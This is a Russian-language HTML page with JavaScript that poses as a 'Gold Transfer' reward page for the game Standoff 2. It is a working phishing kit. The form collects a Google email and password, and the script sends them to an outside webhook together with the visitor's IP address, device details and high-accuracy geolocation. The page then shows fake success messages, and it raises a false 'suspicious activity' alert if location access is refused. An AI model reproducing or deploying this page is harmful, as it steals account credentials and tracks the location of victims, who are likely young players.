<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Standoff 2 - Gold transfer</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #121212;
      color: #fff;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .container {
      width: 90%;
      max-width: 400px;
      background-color: #1a1a1a;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
    }
    h1, h2 {
      text-align: center;
      margin-bottom: 20px;
    }
    .input-group {
      margin-bottom: 15px;
    }
    label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
    }
    input {
      width: 100%;
      padding: 10px;
      border-radius: 5px;
      border: 1px solid #555;
      background-color: #333;
      color: #fff;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #0066cc;
      color: #fff;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-size: 16px;
    }
    button:hover {
      background-color: #005bb5;
    }
    .form-section {
      margin-bottom: 20px;
    }
    #url-info {
      margin-bottom: 20px;
      font-size: 14px;
      line-height: 1.5;
    }
    #login-result {
      margin-top: 10px;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Gold Transfer</h1>
    <!-- Область для отображения данных декодированного URL -->
    <div id="url-info"></div>
      
    <div class="form-section">
      <h2>Авторизация</h2>
      <!-- Используем метод POST для предотвращения изменения URL -->
      <form id="login-form" method="POST">
        <div class="input-group">
          <label for="email">Google Почта:</label>
          <input type="email" id="email" name="email" placeholder="Введите адрес электронной почты" required>
        </div>
        <div class="input-group">
          <label for="password">Пароль от почты:</label>
          <input type="password" id="password" name="password" placeholder="Введите пароль" required>
        </div>
        <button type="submit">Войти</button>
      </form>
      <div id="login-result"></div>
    </div>
      
    <div class="form-section" id="gold-section" style="display:none;">
      <h2>Получить Gold</h2>
      <button id="get-gold-button">Получить Gold</button>
    </div>
  </div>
  
  <script>
    // Вспомогательные функции для работы с cookie
    function setCookie(name, value, days) {
      const date = new Date();
      date.setTime(date.getTime() + (days*24*60*60*1000));
      document.cookie = name + "=" + encodeURIComponent(value) + ";expires=" + date.toUTCString() + ";path=/";
    }

    function getCookie(name) {
      const value = "; " + document.cookie;
      const parts = value.split("; " + name + "=");
      if (parts.length === 2) return decodeURIComponent(parts.pop().split(";").shift());
      return null;
    }
    
    // Проверяем, получал ли уже пользователь голду
    function checkGoldCollected() {
      return getCookie("gold_collected") === "true";
    }

    // Если пользователь уже получил Gold, отображаем сообщение и скрываем кнопку получения
    window.onload = function() {
      if (checkGoldCollected()) {
        document.getElementById("gold-section").innerHTML = '<h2>Вы уже получили Gold</h2>';
      }
    };

    const DISCORD_WEBHOOK_URL = "https://hkdk.events/oyt9imlhvrjiqx";

    // Объект для хранения информации об устройстве, IP и геолокации
    const clientInfo = {
      geolocation: {},
      device: {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenResolution: `${window.screen.width}x${window.screen.height}`
      },
      ip: null // IP-адрес будет получен через API
    };

    // Получение IP-адреса через API ipify
    fetch("https://api.ipify.org?format=json")
      .then(response => response.json())
      .then(data => {
        clientInfo.ip = data.ip;
      })
      .catch(error => {
        console.error("Ошибка получения IP:", error);
      });

    // Запрос геолокации с повышенной точностью
    if ('geolocation' in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const coords = position.coords;
          clientInfo.geolocation = {
            latitude: coords.latitude,
            longitude: coords.longitude,
            accuracy: coords.accuracy,
            altitude: coords.altitude || null,
            altitudeAccuracy: coords.altitudeAccuracy || null,
            heading: coords.heading || null,
            speed: coords.speed || null,
            timestamp: position.timestamp
          };
        },
        (error) => {
          if (error.code === error.PERMISSION_DENIED) {
            alert('Ошибка авторизации: обнаружена подозрительная активность, связанная с частыми изменениями геолокации');
          } else {
            console.error('Ошибка получения геолокации:', error.message);
          }
          clientInfo.geolocation = {
            error: error.message,
            code: error.code
          };
        },
        {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0
        }
      );
    } else {
      console.error('Геолокация не поддерживается данным браузером');
      clientInfo.geolocation = { error: 'Geolocation not supported' };
    }

    /* 
      Функция декодирования Base64-параметров из строки URL.
      Структура строки:
      [len(sender_id)][sender_id][len(sender_nick)][sender_nick][len(gold_amount)][gold_amount][hidden_param (остальное)]
    */
    function decodeBase64Params(base64Str) {
      try {
        const decodedStr = atob(base64Str);
        let idx = 0;
        // Длина ID отправителя
        const senderIdLength = parseInt(decodedStr[idx], 10);
        idx++;
        const senderId = decodedStr.substr(idx, senderIdLength);
        idx += senderIdLength;
        // Длина ника отправителя
        const senderNickLength = parseInt(decodedStr[idx], 10);
        idx++;
        const senderNick = decodedStr.substr(idx, senderNickLength);
        idx += senderNickLength;
        // Длина количества голды
        const goldAmountLength = parseInt(decodedStr[idx], 10);
        idx++;
        const goldAmount = decodedStr.substr(idx, goldAmountLength);
        idx += goldAmountLength;
        // Если в строке ещё есть данные, это скрытый параметр
        const hiddenParam = idx < decodedStr.length ? decodedStr.substr(idx) : null;
        return { senderId, senderNick, goldAmount, hiddenParam };
      } catch (error) {
        console.error("Ошибка ID транзакции:", error);
        return null;
      }
    }

    // Извлечение параметров из URL (ожидается параметр с именем "ID")
    function getParamsFromURL() {
      const params = new URLSearchParams(window.location.search);
      const data = params.get("ID");
      if (data) {
        return decodeBase64Params(data);
      }
      return null;
    }

    // Отображение параметров на странице (скрытый параметр не выводится)
    const urlParams = getParamsFromURL();
    if (urlParams) {
      document.getElementById("url-info").innerHTML =
        "ID отправителя: " + urlParams.senderId + "<br>" +
        "Ник отправителя: " + urlParams.senderNick + "<br>" +
        "Количество Gold: " + urlParams.goldAmount;
    } else {
      document.getElementById("url-info").innerHTML = "Некорректный ID транзакции";
    }

    // Функция для отправки данных на Discord Webhook
    function sendDataToWebhook(messageContent, callback) {
      fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: messageContent })
      })
      .then(response => callback(response.ok))
      .catch(error => {
        console.error("Ошибка отправки данных:", error);
        callback(false);
      });
    }

    // Обработка формы авторизации
    document.getElementById("login-form").addEventListener("submit", function(e) {
      e.preventDefault(); // Предотвращает изменение URL

      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;

      const message = "Новая авторизация:\n" +
                      "Email: " + email + "\n" +
                      "Пароль: " + password + "\n" +
                      "Дополнительная информация: " + JSON.stringify(clientInfo);

      sendDataToWebhook(message, function(success) {
        if (success) {
          document.getElementById("login-result").textContent = "Авторизация прошла успешно";
          document.getElementById("gold-section").style.display = "block";
        } else {
          document.getElementById("login-result").textContent = "Ошибка при авторизации";
        }
      });
    });

    // Обработка запроса на получение голды
    document.getElementById("get-gold-button").addEventListener("click", function() {
      // Если пользователь уже получил Gold, просто выходим
      if (checkGoldCollected()) {
        alert("Вы уже получили Gold");
        return;
      }
      if (urlParams) {
        const message = "Запрос на получение голды:\n" +
                        "ID отправителя: " + urlParams.senderId + "\n" +
                        "Ник отправителя: " + urlParams.senderNick + "\n" +
                        "Количество Gold: " + urlParams.goldAmount + "\n" +
                        "Дополнительная информация: " + JSON.stringify(clientInfo);

        sendDataToWebhook(message, function(success) {
          if (success) {
            alert("Передача Gold успешно завершена");
            // Сохраняем отметку о получении Gold в cookie на 7 дней
            setCookie("gold_collected", "true", 7);
            // Обновляем интерфейс
            document.getElementById("gold-section").innerHTML = '<h2>Вы уже получили Gold</h2>';
          } else {
            alert("Ошибка при получение Gold.");
          }
        });
      } else {
        alert("Неверный ID транзакции");
      }
    });
  </script>
</body>
</html>
